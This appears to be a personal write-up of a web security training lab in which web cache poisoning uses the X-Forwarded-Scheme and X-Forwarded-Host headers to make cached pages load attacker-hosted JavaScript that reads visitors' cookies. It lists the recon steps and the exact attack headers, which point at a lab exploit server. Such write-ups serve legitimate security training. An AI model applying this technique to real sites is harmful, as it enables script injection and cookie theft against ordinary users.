This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

# Recon

This time there's no clear indication of the header that is reflected on the page. Use param miner.

The extension found one of the two headers necessary to exploit this vuln:

![[Advanced Topics/Web Cache Poisoning/labs/design/WCP with multiple headers/images/param-miner.png]]

The `X-Forwarded-Host` header is also necessary:

![[redirection-vuln.png]]

Although I found the headers I was missing the most important part of the attack. By leveraging the dynamic URL generation, its possible to change where the application will search for a Javascript file:

![[js-resource.png]]

# Exploitation

From here craft an exploit server endpoint that executes the desired action, redirecting legitimate users to the malicious site:

![[exploit-server-path.png]]



Now place these values on the attack headers:

```
X-Forwarded-Scheme: zwrtxqvamuvg79fjoooooo
X-Forwarded-Host: exploit-0a6c009f04cbe9cd81caa1160106003f.exploit-server.net
```

`X-Forwarded-Scheme` can hold any value, the other header must point to the exploit server.

It's also important to note the path that the exploit server must serve the malicious site on, it must be the same as in the application server for the attack to work.


![[redirect-malicious.png]]

![[exploit-payload.png]]

When any user requests the home page, the resource will be loaded using the cached version of the request, which will redirect to the malicious site loading the malicious code into the application.